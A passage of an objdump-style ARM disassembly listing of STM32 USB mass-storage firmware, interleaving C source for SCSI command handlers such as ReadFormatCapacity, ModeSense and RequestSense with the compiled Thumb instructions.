 8009f40:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f44:	0a1b      	lsrs	r3, r3, #8
 8009f46:	b29b      	uxth	r3, r3
 8009f48:	b2da      	uxtb	r2, r3
 8009f4a:	69bb      	ldr	r3, [r7, #24]
 8009f4c:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009f4e:	69bb      	ldr	r3, [r7, #24]
 8009f50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f54:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f58:	b2da      	uxtb	r2, r3
 8009f5a:	69bb      	ldr	r3, [r7, #24]
 8009f5c:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f5e:	687b      	ldr	r3, [r7, #4]
 8009f60:	330a      	adds	r3, #10
 8009f62:	781b      	ldrb	r3, [r3, #0]
 8009f64:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009f66:	687b      	ldr	r3, [r7, #4]
 8009f68:	330b      	adds	r3, #11
 8009f6a:	781b      	ldrb	r3, [r3, #0]
 8009f6c:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f6e:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009f70:	687b      	ldr	r3, [r7, #4]
 8009f72:	330c      	adds	r3, #12
 8009f74:	781b      	ldrb	r3, [r3, #0]
 8009f76:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009f78:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009f7a:	687a      	ldr	r2, [r7, #4]
 8009f7c:	320d      	adds	r2, #13
 8009f7e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009f80:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f82:	69bb      	ldr	r3, [r7, #24]
 8009f84:	60da      	str	r2, [r3, #12]

  return 0;
 8009f86:	2300      	movs	r3, #0
}
 8009f88:	4618      	mov	r0, r3
 8009f8a:	3724      	adds	r7, #36	; 0x24
 8009f8c:	46bd      	mov	sp, r7
 8009f8e:	bd90      	pop	{r4, r7, pc}

08009f90 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f90:	b580      	push	{r7, lr}
 8009f92:	b088      	sub	sp, #32
 8009f94:	af00      	add	r7, sp, #0
 8009f96:	60f8      	str	r0, [r7, #12]
 8009f98:	460b      	mov	r3, r1
 8009f9a:	607a      	str	r2, [r7, #4]
 8009f9c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f9e:	68fb      	ldr	r3, [r7, #12]
 8009fa0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009fa4:	68fb      	ldr	r3, [r7, #12]
 8009fa6:	32b0      	adds	r2, #176	; 0xb0
 8009fa8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009fac:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009fae:	69bb      	ldr	r3, [r7, #24]
 8009fb0:	2b00      	cmp	r3, #0
 8009fb2:	d102      	bne.n	8009fba <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009fb4:	f04f 33ff 	mov.w	r3, #4294967295
 8009fb8:	e063      	b.n	800a082 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009fba:	68fb      	ldr	r3, [r7, #12]
 8009fbc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009fc0:	68fa      	ldr	r2, [r7, #12]
 8009fc2:	33b0      	adds	r3, #176	; 0xb0
 8009fc4:	009b      	lsls	r3, r3, #2
 8009fc6:	4413      	add	r3, r2
 8009fc8:	685b      	ldr	r3, [r3, #4]
 8009fca:	685b      	ldr	r3, [r3, #4]
 8009fcc:	f107 0214 	add.w	r2, r7, #20
 8009fd0:	f107 0110 	add.w	r1, r7, #16
 8009fd4:	7af8      	ldrb	r0, [r7, #11]
 8009fd6:	4798      	blx	r3
 8009fd8:	4603      	mov	r3, r0
 8009fda:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009fdc:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009fe0:	2b00      	cmp	r3, #0
 8009fe2:	d106      	bne.n	8009ff2 <SCSI_ReadFormatCapacity+0x62>
 8009fe4:	69bb      	ldr	r3, [r7, #24]
 8009fe6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fea:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009fee:	2b02      	cmp	r3, #2
 8009ff0:	d108      	bne.n	800a004 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ff2:	7af9      	ldrb	r1, [r7, #11]
 8009ff4:	233a      	movs	r3, #58	; 0x3a
 8009ff6:	2202      	movs	r2, #2
 8009ff8:	68f8      	ldr	r0, [r7, #12]
 8009ffa:	f000 f941 	bl	800a280 <SCSI_SenseCode>
    return -1;
 8009ffe:	f04f 33ff 	mov.w	r3, #4294967295
 800a002:	e03e      	b.n	800a082 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a004:	2300      	movs	r3, #0
 800a006:	83fb      	strh	r3, [r7, #30]
 800a008:	e007      	b.n	800a01a <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a00a:	8bfb      	ldrh	r3, [r7, #30]
 800a00c:	69ba      	ldr	r2, [r7, #24]
 800a00e:	4413      	add	r3, r2
 800a010:	2200      	movs	r2, #0
 800a012:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a014:	8bfb      	ldrh	r3, [r7, #30]
 800a016:	3301      	adds	r3, #1
 800a018:	83fb      	strh	r3, [r7, #30]
 800a01a:	8bfb      	ldrh	r3, [r7, #30]
 800a01c:	2b0b      	cmp	r3, #11
 800a01e:	d9f4      	bls.n	800a00a <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a020:	69bb      	ldr	r3, [r7, #24]
 800a022:	2208      	movs	r2, #8
 800a024:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a026:	693b      	ldr	r3, [r7, #16]
 800a028:	3b01      	subs	r3, #1
 800a02a:	0e1b      	lsrs	r3, r3, #24
 800a02c:	b2da      	uxtb	r2, r3
 800a02e:	69bb      	ldr	r3, [r7, #24]
 800a030:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a032:	693b      	ldr	r3, [r7, #16]
 800a034:	3b01      	subs	r3, #1
 800a036:	0c1b      	lsrs	r3, r3, #16
 800a038:	b2da      	uxtb	r2, r3
 800a03a:	69bb      	ldr	r3, [r7, #24]
 800a03c:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a03e:	693b      	ldr	r3, [r7, #16]
 800a040:	3b01      	subs	r3, #1
 800a042:	0a1b      	lsrs	r3, r3, #8
 800a044:	b2da      	uxtb	r2, r3
 800a046:	69bb      	ldr	r3, [r7, #24]
 800a048:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a04a:	693b      	ldr	r3, [r7, #16]
 800a04c:	b2db      	uxtb	r3, r3
 800a04e:	3b01      	subs	r3, #1
 800a050:	b2da      	uxtb	r2, r3
 800a052:	69bb      	ldr	r3, [r7, #24]
 800a054:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a056:	69bb      	ldr	r3, [r7, #24]
 800a058:	2202      	movs	r2, #2
 800a05a:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a05c:	8abb      	ldrh	r3, [r7, #20]
 800a05e:	141b      	asrs	r3, r3, #16
 800a060:	b2da      	uxtb	r2, r3
 800a062:	69bb      	ldr	r3, [r7, #24]
 800a064:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a066:	8abb      	ldrh	r3, [r7, #20]
 800a068:	0a1b      	lsrs	r3, r3, #8
 800a06a:	b29b      	uxth	r3, r3
 800a06c:	b2da      	uxtb	r2, r3
 800a06e:	69bb      	ldr	r3, [r7, #24]
 800a070:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a072:	8abb      	ldrh	r3, [r7, #20]
 800a074:	b2da      	uxtb	r2, r3
 800a076:	69bb      	ldr	r3, [r7, #24]
 800a078:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a07a:	69bb      	ldr	r3, [r7, #24]
 800a07c:	220c      	movs	r2, #12
 800a07e:	60da      	str	r2, [r3, #12]

  return 0;
 800a080:	2300      	movs	r3, #0
}
 800a082:	4618      	mov	r0, r3
 800a084:	3720      	adds	r7, #32
 800a086:	46bd      	mov	sp, r7
 800a088:	bd80      	pop	{r7, pc}
	...

0800a08c <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a08c:	b580      	push	{r7, lr}
 800a08e:	b086      	sub	sp, #24
 800a090:	af00      	add	r7, sp, #0
 800a092:	60f8      	str	r0, [r7, #12]
 800a094:	460b      	mov	r3, r1
 800a096:	607a      	str	r2, [r7, #4]
 800a098:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a09a:	68fb      	ldr	r3, [r7, #12]
 800a09c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0a0:	68fb      	ldr	r3, [r7, #12]
 800a0a2:	32b0      	adds	r2, #176	; 0xb0
 800a0a4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0a8:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a0aa:	2317      	movs	r3, #23
 800a0ac:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a0ae:	693b      	ldr	r3, [r7, #16]
 800a0b0:	2b00      	cmp	r3, #0
 800a0b2:	d102      	bne.n	800a0ba <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a0b4:	f04f 33ff 	mov.w	r3, #4294967295
 800a0b8:	e011      	b.n	800a0de <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a0ba:	687b      	ldr	r3, [r7, #4]
 800a0bc:	3304      	adds	r3, #4
 800a0be:	781b      	ldrb	r3, [r3, #0]
 800a0c0:	b29b      	uxth	r3, r3
 800a0c2:	8afa      	ldrh	r2, [r7, #22]
 800a0c4:	429a      	cmp	r2, r3
 800a0c6:	d303      	bcc.n	800a0d0 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a0c8:	687b      	ldr	r3, [r7, #4]
 800a0ca:	3304      	adds	r3, #4
 800a0cc:	781b      	ldrb	r3, [r3, #0]
 800a0ce:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a0d0:	8afb      	ldrh	r3, [r7, #22]
 800a0d2:	461a      	mov	r2, r3
 800a0d4:	4904      	ldr	r1, [pc, #16]	; (800a0e8 <SCSI_ModeSense6+0x5c>)
 800a0d6:	6938      	ldr	r0, [r7, #16]
 800a0d8:	f000 feb8 	bl	800ae4c <SCSI_UpdateBotData>

  return 0;
 800a0dc:	2300      	movs	r3, #0
}
 800a0de:	4618      	mov	r0, r3
 800a0e0:	3718      	adds	r7, #24
 800a0e2:	46bd      	mov	sp, r7
 800a0e4:	bd80      	pop	{r7, pc}
 800a0e6:	bf00      	nop
 800a0e8:	2000011c 	.word	0x2000011c

0800a0ec <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0ec:	b580      	push	{r7, lr}
 800a0ee:	b086      	sub	sp, #24
 800a0f0:	af00      	add	r7, sp, #0
 800a0f2:	60f8      	str	r0, [r7, #12]
 800a0f4:	460b      	mov	r3, r1
 800a0f6:	607a      	str	r2, [r7, #4]
 800a0f8:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0fa:	68fb      	ldr	r3, [r7, #12]
 800a0fc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a100:	68fb      	ldr	r3, [r7, #12]
 800a102:	32b0      	adds	r2, #176	; 0xb0
 800a104:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a108:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a10a:	231b      	movs	r3, #27
 800a10c:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a10e:	693b      	ldr	r3, [r7, #16]
 800a110:	2b00      	cmp	r3, #0
 800a112:	d102      	bne.n	800a11a <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a114:	f04f 33ff 	mov.w	r3, #4294967295
 800a118:	e011      	b.n	800a13e <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a11a:	687b      	ldr	r3, [r7, #4]
 800a11c:	3308      	adds	r3, #8
 800a11e:	781b      	ldrb	r3, [r3, #0]
 800a120:	b29b      	uxth	r3, r3
 800a122:	8afa      	ldrh	r2, [r7, #22]
 800a124:	429a      	cmp	r2, r3
 800a126:	d303      	bcc.n	800a130 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a128:	687b      	ldr	r3, [r7, #4]
 800a12a:	3308      	adds	r3, #8
 800a12c:	781b      	ldrb	r3, [r3, #0]
 800a12e:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a130:	8afb      	ldrh	r3, [r7, #22]
 800a132:	461a      	mov	r2, r3
 800a134:	4904      	ldr	r1, [pc, #16]	; (800a148 <SCSI_ModeSense10+0x5c>)
 800a136:	6938      	ldr	r0, [r7, #16]
 800a138:	f000 fe88 	bl	800ae4c <SCSI_UpdateBotData>

  return 0;
 800a13c:	2300      	movs	r3, #0
}
 800a13e:	4618      	mov	r0, r3
 800a140:	3718      	adds	r7, #24
 800a142:	46bd      	mov	sp, r7
 800a144:	bd80      	pop	{r7, pc}
 800a146:	bf00      	nop
 800a148:	20000134 	.word	0x20000134

0800a14c <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a14c:	b580      	push	{r7, lr}
 800a14e:	b086      	sub	sp, #24
 800a150:	af00      	add	r7, sp, #0
 800a152:	60f8      	str	r0, [r7, #12]
 800a154:	460b      	mov	r3, r1
 800a156:	607a      	str	r2, [r7, #4]
 800a158:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a15a:	68fb      	ldr	r3, [r7, #12]
 800a15c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a160:	68fb      	ldr	r3, [r7, #12]
 800a162:	32b0      	adds	r2, #176	; 0xb0
 800a164:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a168:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a16a:	693b      	ldr	r3, [r7, #16]
 800a16c:	2b00      	cmp	r3, #0
 800a16e:	d102      	bne.n	800a176 <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a170:	f04f 33ff 	mov.w	r3, #4294967295
 800a174:	e080      	b.n	800a278 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a176:	693b      	ldr	r3, [r7, #16]
 800a178:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a17c:	699b      	ldr	r3, [r3, #24]
 800a17e:	2b00      	cmp	r3, #0
 800a180:	d10b      	bne.n	800a19a <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a182:	693b      	ldr	r3, [r7, #16]
 800a184:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a188:	7f59      	ldrb	r1, [r3, #29]
 800a18a:	2320      	movs	r3, #32
 800a18c:	2205      	movs	r2, #5
 800a18e:	68f8      	ldr	r0, [r7, #12]
 800a190:	f000 f876 	bl	800a280 <SCSI_SenseCode>
    return -1;
 800a194:	f04f 33ff 	mov.w	r3, #4294967295
 800a198:	e06e      	b.n	800a278 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a19a:	2300      	movs	r3, #0
 800a19c:	75fb      	strb	r3, [r7, #23]
 800a19e:	e007      	b.n	800a1b0 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a1a0:	7dfb      	ldrb	r3, [r7, #23]
 800a1a2:	693a      	ldr	r2, [r7, #16]
 800a1a4:	4413      	add	r3, r2
 800a1a6:	2200      	movs	r2, #0
 800a1a8:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a1aa:	7dfb      	ldrb	r3, [r7, #23]
 800a1ac:	3301      	adds	r3, #1
 800a1ae:	75fb      	strb	r3, [r7, #23]
 800a1b0:	7dfb      	ldrb	r3, [r7, #23]
 800a1b2:	2b11      	cmp	r3, #17
 800a1b4:	d9f4      	bls.n	800a1a0 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a1b6:	693b      	ldr	r3, [r7, #16]
 800a1b8:	2270      	movs	r2, #112	; 0x70
 800a1ba:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a1bc:	693b      	ldr	r3, [r7, #16]
 800a1be:	220c      	movs	r2, #12
 800a1c0:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a1c2:	693b      	ldr	r3, [r7, #16]
 800a1c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1c8:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a1cc:	693b      	ldr	r3, [r7, #16]
 800a1ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1d2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1d6:	429a      	cmp	r2, r3
 800a1d8:	d03f      	beq.n	800a25a <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a1da:	693b      	ldr	r3, [r7, #16]
 800a1dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1e0:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1e4:	461a      	mov	r2, r3
 800a1e6:	693b      	ldr	r3, [r7, #16]
 800a1e8:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a1ec:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a1f0:	693b      	ldr	r3, [r7, #16]
 800a1f2:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a1f4:	693b      	ldr	r3, [r7, #16]
 800a1f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1fa:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1fe:	693a      	ldr	r2, [r7, #16]
 800a200:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a204:	00db      	lsls	r3, r3, #3
 800a206:	4413      	add	r3, r2
 800a208:	791a      	ldrb	r2, [r3, #4]
 800a20a:	693b      	ldr	r3, [r7, #16]
 800a20c:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a20e:	693b      	ldr	r3, [r7, #16]
 800a210:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a214:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a218:	693a      	ldr	r2, [r7, #16]
 800a21a:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a21e:	00db      	lsls	r3, r3, #3
 800a220:	4413      	add	r3, r2
 800a222:	795a      	ldrb	r2, [r3, #5]
 800a224:	693b      	ldr	r3, [r7, #16]
 800a226:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a228:	693b      	ldr	r3, [r7, #16]
 800a22a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a22e:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a232:	3301      	adds	r3, #1
 800a234:	b2da      	uxtb	r2, r3
 800a236:	693b      	ldr	r3, [r7, #16]
 800a238:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a23c:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a240:	693b      	ldr	r3, [r7, #16]
 800a242:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a246:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a24a:	2b04      	cmp	r3, #4
 800a24c:	d105      	bne.n	800a25a <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a24e:	693b      	ldr	r3, [r7, #16]
 800a250:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a254:	2200      	movs	r2, #0
 800a256:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a25a:	693b      	ldr	r3, [r7, #16]
 800a25c:	2212      	movs	r2, #18
 800a25e:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a260:	687b      	ldr	r3, [r7, #4]
 800a262:	3304      	adds	r3, #4
 800a264:	781b      	ldrb	r3, [r3, #0]
 800a266:	2b12      	cmp	r3, #18
 800a268:	d805      	bhi.n	800a276 <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a26a:	687b      	ldr	r3, [r7, #4]
 800a26c:	3304      	adds	r3, #4
 800a26e:	781b      	ldrb	r3, [r3, #0]
 800a270:	461a      	mov	r2, r3
 800a272:	693b      	ldr	r3, [r7, #16]
 800a274:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a276:	2300      	movs	r3, #0
}
 800a278:	4618      	mov	r0, r3
 800a27a:	3718      	adds	r7, #24
 800a27c:	46bd      	mov	sp, r7
 800a27e:	bd80      	pop	{r7, pc}

0800a280 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a280:	b480      	push	{r7}
 800a282:	b085      	sub	sp, #20
 800a284:	af00      	add	r7, sp, #0
 800a286:	6078      	str	r0, [r7, #4]
 800a288:	4608      	mov	r0, r1
 800a28a:	4611      	mov	r1, r2
 800a28c:	461a      	mov	r2, r3
 800a28e:	4603      	mov	r3, r0
 800a290:	70fb      	strb	r3, [r7, #3]
 800a292:	460b      	mov	r3, r1
 800a294:	70bb      	strb	r3, [r7, #2]
 800a296:	4613      	mov	r3, r2
 800a298:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a29a:	687b      	ldr	r3, [r7, #4]
 800a29c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2a0:	687b      	ldr	r3, [r7, #4]
 800a2a2:	32b0      	adds	r2, #176	; 0xb0
 800a2a4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2a8:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a2aa:	68fb      	ldr	r3, [r7, #12]
 800a2ac:	2b00      	cmp	r3, #0
 800a2ae:	d03d      	beq.n	800a32c <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a2b0:	68fb      	ldr	r3, [r7, #12]
 800a2b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2b6:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2ba:	461a      	mov	r2, r3
 800a2bc:	68fb      	ldr	r3, [r7, #12]
 800a2be:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a2c2:	78b9      	ldrb	r1, [r7, #2]
 800a2c4:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a2c8:	68fb      	ldr	r3, [r7, #12]
 800a2ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ce:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2d2:	68fa      	ldr	r2, [r7, #12]
 800a2d4:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a2d8:	00db      	lsls	r3, r3, #3
 800a2da:	4413      	add	r3, r2
 800a2dc:	787a      	ldrb	r2, [r7, #1]
 800a2de:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a2e0:	68fb      	ldr	r3, [r7, #12]
 800a2e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2e6:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2ea:	68fa      	ldr	r2, [r7, #12]
 800a2ec:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a2f0:	00db      	lsls	r3, r3, #3
 800a2f2:	4413      	add	r3, r2
 800a2f4:	2200      	movs	r2, #0
 800a2f6:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a2f8:	68fb      	ldr	r3, [r7, #12]
 800a2fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2fe:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a302:	3301      	adds	r3, #1
 800a304:	b2da      	uxtb	r2, r3
 800a306:	68fb      	ldr	r3, [r7, #12]
 800a308:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a30c:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a310:	68fb      	ldr	r3, [r7, #12]
 800a312:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a316:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a31a:	2b04      	cmp	r3, #4
 800a31c:	d107      	bne.n	800a32e <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a31e:	68fb      	ldr	r3, [r7, #12]
 800a320:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a324:	2200      	movs	r2, #0
 800a326:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a32a:	e000      	b.n	800a32e <SCSI_SenseCode+0xae>
    return;
 800a32c:	bf00      	nop
  }
}
 800a32e:	3714      	adds	r7, #20
 800a330:	46bd      	mov	sp, r7
 800a332:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a336:	4770      	bx	lr

0800a338 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a338:	b580      	push	{r7, lr}
 800a33a:	b086      	sub	sp, #24
 800a33c:	af00      	add	r7, sp, #0
 800a33e:	60f8      	str	r0, [r7, #12]
 800a340:	460b      	mov	r3, r1
 800a342:	607a      	str	r2, [r7, #4]
 800a344:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a346:	68fb      	ldr	r3, [r7, #12]
